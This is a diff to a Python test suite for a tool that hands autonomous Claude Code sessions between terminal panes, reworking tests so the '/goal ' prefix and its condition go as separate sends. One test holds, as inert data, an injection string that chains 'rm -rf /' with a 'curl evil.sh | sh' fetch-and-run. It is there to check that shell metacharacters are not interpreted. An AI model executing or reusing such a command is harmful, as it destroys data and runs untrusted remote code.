@@ -187,6 +187,22 @@ def _sent(runner) -> list[str]:
     return [c[4] for c in runner.calls if c[:3] == ["herdr", "pane", "send-text"]]
 
 
+def _submissions(runner) -> list[str]:
+    """The same sends, with the goal's two (#1007) rejoined into the one command the box holds.
+
+    The goal now travels as `/goal ` and then the condition, so the raw send list has one more
+    entry than there are submissions. Tests about ORDER care about submissions; tests about the
+    split itself read `_sent` directly.
+    """
+    out: list[str] = []
+    for text in _sent(runner):
+        if out and out[-1] == ll._GOAL_PREFIX:
+            out[-1] += text
+        else:
+            out.append(text)
+    return out
+
+
 def _raise(exc):
     def reader(_path):
         raise exc
@@ -236,18 +252,20 @@ def test_agent_start_enforces_the_readiness_timeout_floor() -> None:
 
 def test_multiline_condition_survives_the_send_text_route_verbatim() -> None:
     condition = "PR open with green CI\nor a blocker is posted via the ERROR protocol"
-    text_argv, keys_argv, truncated = ll.build_send_text_goal_argv(
+    sends, keys_argv, truncated = ll.build_send_text_goal_argv(
         pane="w1:pZZ", goal_condition=condition)
     assert truncated is False
-    assert text_argv[4] == f"/goal {condition}", "condition must be byte-identical"
+    assert _sent_command(sends) == f"/goal {condition}", "condition must be byte-identical"
+    assert sends[1][4] == condition, "the condition travels as its own send (#1007)"
     assert "Enter" in keys_argv
 
 
 def test_goal_metacharacters_stay_one_argv_element() -> None:
     nasty = "green CI; rm -rf / $(whoami) `id` && curl evil.sh | sh"
-    text_argv, _, _ = ll.build_send_text_goal_argv(pane="w1:pZZ", goal_condition=nasty)
-    assert text_argv[4] == f"/goal {nasty}"
-    assert len([a for a in text_argv if a.startswith("/goal ")]) == 1
+    sends, _, _ = ll.build_send_text_goal_argv(pane="w1:pZZ", goal_condition=nasty)
+    assert _sent_command(sends) == f"/goal {nasty}"
+    assert sends[1][4] == nasty, "the whole condition stays one argv element"
+    assert len([a for s in sends for a in s if a.startswith("/goal ")]) == 1
 
 
 def test_truncation_is_reported_not_discarded() -> None:
@@ -255,6 +273,82 @@ def test_truncation_is_reported_not_discarded() -> None:
     assert truncated is True
     text, _ = ll.goal_text("x" * 5000)
     assert len(text) <= ll.GOAL_MAX_CHARS
+
+
+def _sent_command(sends) -> str:
+    """What the successor's input box ends up holding: every send's text, in order.
+
+    The goal arrives as more than one send (#1007), so the thing worth asserting is the COMMAND
+    the box ends up with — not the payload of any single send.
+    """
+    return "".join(s[4] for s in sends)
+
+
+class TestTheGoalPrefixIsItsOwnSend:
+    """#1007 — `/goal ` must be a SEPARATE send from the condition, or it never arms.
+
+    Claude Code collapses a large bracketed paste into one `[Pasted text #N]` chip. Sent combined,
+    the `/goal ` prefix is collapsed with the condition, so no slash command is ever text at the
+    start of the input box and the Enter submits an ordinary message. The successor then runs an
+    autonomous handoff with no guard while the handoff reports success.
+
+    Measured 2026-08-08 on a throwaway pane (`w1:pNT`):
+      - a 3,574-char / 21-line condition sent COMBINED rendered as `[Pasted text #1 +20 lines]`
+        and armed nothing;
+      - the SAME condition sent as `/goal ` then a separate paste rendered as
+        `/goal [Pasted text #2 +20 lines]`, and Enter produced `◎ /goal active` plus a stamped
+        `goal_status sentinel=true met=false` row whose condition matched byte-for-byte;
+      - at 483 chars the combined shape did NOT collapse — which is why the short-condition tests
+        in this file all passed against the broken shape.
+    """
+
+    def test_the_skill_no_longer_claims_the_wired_path_needs_no_change(self) -> None:
+        """The claim that shipped the bug. `skills/pane-handoff/SKILL.md` said the wired path
+        "sends `/goal <condition>` as its own paste with nothing in front of it" and therefore
+        needed no change — which is the broken shape described as the fix. Anchored to ONE
+        canonical sentence in ONE file, per this repo's drift-guard convention."""
+        text = (REPO_ROOT / "skills" / "pane-handoff" / "SKILL.md").read_text(encoding="utf-8")
+        assert "nothing here needs changing for the wired path" not in text
+        assert "being its own paste is NOT leading" in text, \
+            "the corrected rule must stay stated in the skill"
+
+    def test_the_prefix_and_the_condition_are_two_separate_sends(self) -> None:
+        sends, keys_argv, truncated = ll.build_send_text_goal_argv(
+            pane="w1:pZZ", goal_condition="ship it when CI is green")
+        assert len(sends) == 2, sends
+        assert sends[0][4] == "/goal ", "the command must be its own short send"
+        assert sends[1][4] == "ship it when CI is green"
+        assert "/goal" not in sends[1][4], "the condition send must not re-carry the command"
+        assert all(s[:3] == ["herdr", "pane", "send-text"] for s in sends), sends
+        assert "Enter" in keys_argv
+        assert truncated is False
+
+    def test_the_sends_concatenate_to_the_whole_command(self) -> None:
+        """The box must end up holding exactly what the single send used to carry."""
+        cond = "line one\nline two\n\nline four"
+        sends, _keys, _trunc = ll.build_send_text_goal_argv(pane="w1:p1", goal_condition=cond)
+        text, _ = ll.goal_text(cond)
+        assert _sent_command(sends) == text
+
+    def test_truncation_still_caps_the_whole_command_including_the_prefix(self) -> None:
+        """The cap applies to the command, not to the condition alone — and the condition send
+        must carry exactly what the successor's `goal_status` row will hold, or `goal_armed`
+        can never match and predecessor teardown never fires."""
+        sends, _keys, truncated = ll.build_send_text_goal_argv(
+            pane="w1:p1", goal_condition="x" * 5000)
+        assert truncated is True
+        assert len(_sent_command(sends)) <= ll.GOAL_MAX_CHARS
+        armed, _ = ll.armed_condition("x" * 5000)
+        assert sends[1][4] == armed
+
+    def test_a_long_realistic_condition_still_leads_with_the_command(self) -> None:
+        """The regression that mattered: a real owner goal runs 1,200-2,000 chars, well past the
+        length at which the combined shape collapses."""
+        cond = "\n".join("Filler line %02d carries no instruction." % i for i in range(1, 40))
+        assert len(cond) > 1200
+        sends, _keys, _trunc = ll.build_send_text_goal_argv(pane="w1:p1", goal_condition=cond)
+        assert sends[0][4] == "/goal "
+        assert sends[1][4] == cond
 
 
 @pytest.mark.parametrize("bad", [False, 0, [], {}, None, 123])
@@ -437,7 +531,8 @@ class TestPerformHandoff:
             "herdr pane send-text", "herdr pane send-keys",     # SEND 1 — the bind, alone
             "herdr pane send-text", "herdr pane send-keys",     # SEND 2 — the resume prompt
             "herdr agent wait",                                 # the settle's advisory confirm
-            "herdr pane send-text", "herdr pane send-keys",     # SEND 3 — the goal, LAST
+            "herdr pane send-text",                             # SEND 3a — `/goal `, its own send
+            "herdr pane send-text", "herdr pane send-keys",     # SEND 3b — the condition, LAST
             "herdr pane close",                                 # the predecessor, LAST of all
         ]
         assert out["cleanup"] is None, "nothing to clean up when ownership transferred"
@@ -631,34 +726,35 @@ class TestTheGoalPayloadNeverEndsWithANewline:
     """
 
     def test_a_trailing_newline_is_stripped_from_the_sent_payload(self) -> None:
-        text_argv, _keys, _trunc = ll.build_send_text_goal_argv(
+        sends, _keys, _trunc = ll.build_send_text_goal_argv(
             pane="w1:p1", goal_condition="ship it when CI is green\n")
-        assert not text_argv[4].endswith("\n"), repr(text_argv[4][-40:])
-        assert text_argv[4] == "/goal ship it when CI is green"
+        assert not sends[1][4].endswith("\n"), repr(sends[1][4][-40:])
+        assert _sent_command(sends) == "/goal ship it when CI is green"
 
     def test_trailing_blank_lines_and_spaces_go_too(self) -> None:
         """A file written by a heredoc routinely ends `...\\n`, and an edited one `...\\n\\n  `."""
-        text_argv, _keys, _trunc = ll.build_send_text_goal_argv(
+        sends, _keys, _trunc = ll.build_send_text_goal_argv(
             pane="w1:p1", goal_condition="ship it\n\n   \n")
-        assert text_argv[4] == "/goal ship it"
+        assert _sent_command(sends) == "/goal ship it"
 
     def test_armed_condition_matches_what_was_actually_sent(self) -> None:
         """The binding check compares against this. If the strip happened in only one of the two,
         every capped or file-sourced goal would fail to verify for ever."""
         cond, _trunc = ll.armed_condition("ship it when CI is green\n")
-        text_argv, _keys, _trunc2 = ll.build_send_text_goal_argv(
+        sends, _keys, _trunc2 = ll.build_send_text_goal_argv(
             pane="w1:p1", goal_condition="ship it when CI is green\n")
         assert cond == "ship it when CI is green"
-        assert text_argv[4] == "/goal " + cond
+        assert _sent_command(sends) == "/goal " + cond
+        assert sends[1][4] == cond, "the condition send IS what the goal_status row will carry"
 
     def test_interior_newlines_are_untouched(self) -> None:
         """#654 proved a 41-newline condition arrives fine as a collapsed paste. Only the TRAILING
         newline breaks submission, so stripping interior structure would be a regression."""
         cond = "line one\nline two\n\nline four"
-        text_argv, _keys, _trunc = ll.build_send_text_goal_argv(
+        sends, _keys, _trunc = ll.build_send_text_goal_argv(
             pane="w1:p1", goal_condition=cond + "\n")
-        assert text_argv[4] == "/goal " + cond
-        assert text_argv[4].count("\n") == 3
+        assert _sent_command(sends) == "/goal " + cond
+        assert _sent_command(sends).count("\n") == 3
 
     def test_a_condition_that_is_only_whitespace_is_still_refused(self) -> None:
         """Stripping must not turn an empty guard into a silently-armed one."""
@@ -685,21 +781,21 @@ class TestTheGoalPayloadNeverEndsWithANewline:
         silently deleted terminal spaces and tabs, which never blocked submission and which the
         carry contract treats as bytes. So the strip fires only on a whitespace run that actually
         contains a line ending."""
-        text_argv, _keys, _trunc = ll.build_send_text_goal_argv(
+        sends, _keys, _trunc = ll.build_send_text_goal_argv(
             pane="w1:p1", goal_condition="ship it   ")
-        assert text_argv[4] == "/goal ship it   ", repr(text_argv[4])
+        assert _sent_command(sends) == "/goal ship it   ", repr(_sent_command(sends))
 
     def test_spaces_before_a_trailing_newline_go_with_it(self) -> None:
         """A real file routinely ends `...   \\n`. The whole run goes, because it contains one."""
-        text_argv, _keys, _trunc = ll.build_send_text_goal_argv(
+        sends, _keys, _trunc = ll.build_send_text_goal_argv(
             pane="w1:p1", goal_condition="ship it   \n")
-        assert text_argv[4] == "/goal ship it"
+        assert _sent_command(sends) == "/goal ship it"
 
     @pytest.mark.parametrize("ending", ["\n", "\r\n", "\r"])
     def test_every_line_ending_form_is_stripped_from_the_payload(self, ending) -> None:
-        text_argv, _keys, _trunc = ll.build_send_text_goal_argv(
+        sends, _keys, _trunc = ll.build_send_text_goal_argv(
             pane="w1:p1", goal_condition="ship it" + ending)
-        assert text_argv[4] == "/goal ship it", repr(text_argv[4])
+        assert _sent_command(sends) == "/goal ship it", repr(_sent_command(sends))
 
     def test_the_carry_guard_keeps_its_byte_identical_rule(self) -> None:
         """The interaction this fix nearly broke, pinned from BOTH sides.
@@ -1083,7 +1179,7 @@ class TestResumePrompt:
         r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
         out = ll.perform_handoff(runner=r, **_handoff())
         assert out["ok"] is True, out
-        assert _sent(r) == [f"/rawgentic:switch {PROJECT}", RESUME_PROMPT,
+        assert _submissions(r) == [f"/rawgentic:switch {PROJECT}", RESUME_PROMPT,
                             f"/goal {GOAL_CONDITION}"]
 
     def test_resume_prompt_waits_until_the_BIND_is_VERIFIED_landed(self) -> None:
@@ -1841,6 +1937,41 @@ class TestTheThreeSendsAreOrderedAndGated:
         out = ll.perform_handoff(runner=r, **_handoff())
         assert out["ok"] is True, out
         assert self._send_texts(out) == ["send_bind", "send_resume_prompt", "send_text"]
+
+    def test_the_goal_is_two_sends_the_command_then_the_condition(self) -> None:
+        """#1007 — the builder splitting is not enough; the CALLER must send both parts. A loop
+        that iterated only the first element would arm nothing and still look green."""
+        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
+        out = ll.perform_handoff(runner=r, **_handoff())
+        assert out["ok"] is True, out
+        kinds = [s["kind"] for s in out["steps"]]
+        assert "send_goal_prefix" in kinds, kinds
+        assert kinds.index("send_goal_prefix") < kinds.index("send_text") \
+            < kinds.index("send_keys"), kinds
+        sent = [c[4] for c in r.calls if c[:3] == ["herdr", "pane", "send-text"]]
+        assert "/goal " in sent, sent
+        assert sent.index("/goal ") == len(sent) - 2, \
+            "the command must immediately precede the condition send"
+        assert sent[-1] == GOAL_CONDITION
+
+    def test_a_failed_prefix_send_aborts_before_the_condition_and_the_enter(self) -> None:
+        """Per-send failure handling must survive the split: a dropped prefix leaves the box
+        holding a bare paste, so continuing to the Enter would submit the goal as chat."""
+
+        class PrefixFails(Runner):
+            def __call__(self, argv, timeout=180):
+                if argv[:3] == ["herdr", "pane", "send-text"] and argv[4] == "/goal ":
+                    self.calls.append(list(argv))
+                    return FakeProc(returncode=1)
+                return super().__call__(argv, timeout=timeout)
+
+        r = PrefixFails({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
+        out = ll.perform_handoff(runner=r, **_handoff())
+        assert out["ok"] is False
+        assert out["failed_step"] == "send_goal_prefix", out.get("failed_step")
+        sent = [c[4] for c in r.calls if c[:3] == ["herdr", "pane", "send-text"]]
+        assert GOAL_CONDITION not in sent, "the condition was sent after the prefix failed"
+        assert not _predecessor_closed(r)
 
     def test_the_bind_is_its_own_send_carrying_the_project(self) -> None:
         """A bare `/rawgentic:switch` enters the switch skill's LIST MODE and waits for a human
